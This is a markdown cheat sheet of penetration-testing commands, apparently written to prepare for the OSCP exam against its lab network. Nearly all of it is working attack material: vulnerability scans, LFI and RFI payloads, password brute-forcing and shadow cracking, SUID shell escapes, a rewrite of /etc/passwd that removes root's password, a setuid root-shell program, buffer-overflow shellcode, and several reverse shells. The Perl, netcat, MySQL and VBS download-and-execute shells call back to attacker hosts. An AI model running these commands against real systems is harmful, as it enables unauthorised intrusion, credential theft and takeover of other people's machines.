# OSCP
### outline
* Information Gathing
    * [nmap](#nmap)
    * [nikto](#nikto)
    * [gobuster](#gobuster)
    * [enum4linux](#enum4linux)
    * [smbclient](#smbclient)
    * [ftp](#ftp)
    * [snmpwalker](#snmpwalker)
* Web application
    * [LFI](#LFI)
    * [RFI](#RFI)
    * [WordPress](#WordPress)
* LimitShell
    * [rbash](#rbash)
* Password Crack
    * [john](#john)
    * [hydra](#hydra)
    * [ncrack](#ncrack)
* Privilege Escalation
    * [Linux](#Linux)
    * [Windows](#Windows)
* [BufferOverflow](#BufferOverflow)
* [Others](#Others)
### Information Gathering
## nmap
* scanning open port and server
```
$ nmap ip --top-ports 1000 --open -sV
```
* smb vulnerable
```
$ nmap -v -p 139, 445 --script="smb-vuln-*,samba-vuln-*" 10.11.1.1-254
$ nmap -p 139, 445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 10.11.1.1
```
* ftp vulnerable
```
$ nmap -p 21 -sV -sC --script="ftp-vuln-*, ftp-anon" 10.11.1.1-254
```
* http vulnerable
```
$ nmap -v -p 139, 445 --script="http-vuln-*" ip
```
## nikto
* web deep scanning
```
$ nikto -host ip
```
## gobuster
* bruteforcing web directory files
```
$ gobuster -u ip -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
```
## enum4linux
* Windows and Samba systems
```
$ enum4linux -U -o ip
```
## smbclient
* discover directory and os, smb version
```
$ smbclient -L \\DNSname -I ip -N
```
* log in smb server
```
$ smbclient //DNSname/wwwroot -I ip -N
```
## ftp
* try to login as anonymous
```
user: anonymous
pass: anonymous
```
## snmpwalker
```
$ snmpwalk ip -c public -v 2c > result.txt
```
### Web application
## LFI
* ../../../../../etc/passwd%00
* ..%01/..%01/..%01/..%01/..%01/etc/passwd
* ../../../../../etc/passwd%23
%23 equal to MySQL query '?'
* ../../../../../../../../../etc/passwd/././././././.[…]/./././././.
* ../../../../../../../../../boot.ini/………[…]…………
* ../ -> %2e%2e%2f
## RFI
* http://10.11.1.35/addguestbook.php?name=a&comment=b&LANG=http://10.11.0.5/evil.txt
## WordPress
#### wpscan
* find vulnerable
```
$ wpscan -u host
```
#### wpforce
* crack admin's password
```
$ python wpforce.py -si admin -w password-file.txt -u host
```
### LimitShell
## rbash
* edit PATH to escape rbash
```
$ BASH_CMDS[a]=/bin/sh;a 
$ /bin/bash
$ export PATH=$PATH:/bin/
$ export PATH=$PATH:/usr/bin
```
### Password Crack
## john
first obtain /etc/shadow and /etc/passwd, then
```
$ unshadow passwd.txt shadow.txt > hash.txt 
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
## hydra
```
$ hydra -l root -P password-file.txt 10.11.1.219 ssh
```
## ncrack
```
$ ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.35
```
### Privilege Escalation
## Linux
#### Information
* get version
```
$ uname -a
$ cat /etc/*-release
```
* service
```
$ ps
```
#### Priv Esc
find possible entry
```
$ find / -user root -perm -4000 -print 2>/dev/null
$ find / -perm -u=s -type f 2>/dev/null
$ find / -user root -perm -4000 -exec ls -ldb {} \;
```
* nmap
```
$ nmap --interactive
$ nmap> !sh
```
* find
```
$ touch pentestlab
$ find pentestlab -exec whoami \;
$ find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;
```
* vim
```
$ vim.tiny /etc/shadow
# Press ESC key
:set shell=/bin/sh
:shell
```
* bash
```
$ bash -p
```
* less
```
$ less /etc/passwd
!/bin/sh
```
* cp
If we can read/write on /etc/passwd
```
$ cp /etc/passwd /tmp
$ sed -i 's/root:x:0:0:root:\/root:\/bin\/bash/root::0:0:root:\/root:\/bin\/bash/g' /tmp/passwd
$ cat /tmp/passwd > /etc/passwd
```
* mount
```
$ showmount -e ip
$ mount ip:/ /tmp/
$ wget http://10.11.0.186/4777
$ chmod 4777 exploit
```
```
$ ./4777
```
```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
    setuid(0);
    system("/bin/bash");
    return 0;
}
```
https://touhidshaikh.com/blog/?p=788
## Windows
#### Information
* get version
```
$ systeminfo
```
* service
```
$ tasklist
```
* show all folder
```
$ dir /a
```
#### Priv Esc
* psexec
```
$ psexec -u alice -p aliceishere "c:\Users\Public\nc.exe" 10.11.0.49 5555 -e cmd.exe
```
### BufferOverflow
## connect to Windows
* Linux
```
$ service ssh start
$ rdesktop -u offsec -p offsec! ip -f
```
* Windows
Open Tools folder, click putty, type linux ip and run.
## Immunity Debugger
* run exe, attach the execute exe
* record EIP address
```
$ cyclic -l 0xEIP
```
* find badchars(see code)
* find return address
find dll, and type e button to observe, then we can search for jmp esp address(gadget).
```
!moma modules
```
## generate shellcode
```
$ msfvenom --platform Windows -a x86 -p windows/adduser USER=aaa PASS=aaa -f python –e x86/shikata_ga_nai -b "\x00\x0a"
```
## send code
```
r.send("GO" + "A"*2006 + p32(gadget) + "\x90" * 8 + buf)
```
### Others
## linux execute jar file
```
$ java -jar xx.jar
```
## execute sh error
$'\r': command not found convert win dos to unix, it need to convert win dos to unix.
* dos2unix
```
$ dos2unix xxx.sh
```
## use python to call bash
```
$ python -c 'import pty;pty.spawn("/bin/bash")'
```
## can not find ifconfig
* ip a
* or try to fix ifconfig:
```
$ whereis ifconfig
$ PATH="$PATH":/sbin
```
## create shell use msfvenom
```
$ msfvenom -p java/shell_reverse_tcp LHOST=ip LPORT=port -f war > reverse.war
```
## FreeBSD reverse shell
```
$ perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
## .cgi file reverse shell
```
#!/usr/bin/perl
require '/tmp/t.pl';
```
## MySQL reverse shell
```
select cmdshell("C:\\nc.exe 10.11.0.186 4444 -e cmd.exe")
```
## find share folder
When we found a shared folder, we can upload file to there.
```
$ showmount -e ip
```
## vbs reverse shell
use it to download nc.exe and reverse shell with cscript.
```
$ cmd.exe /c "@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs
&@echo objXMLHTTP.open "GET","http://10.11.0.186/nc.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLH
TTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB
.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.
Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.
vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFi
le "nc.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objA
DOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=No
thing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vb
s&@echo objShell.Exec("nc.exe -e cmd.exe 10.11.0.186 4444")>>poc.vbs&cscript.exe poc.vbs"
```
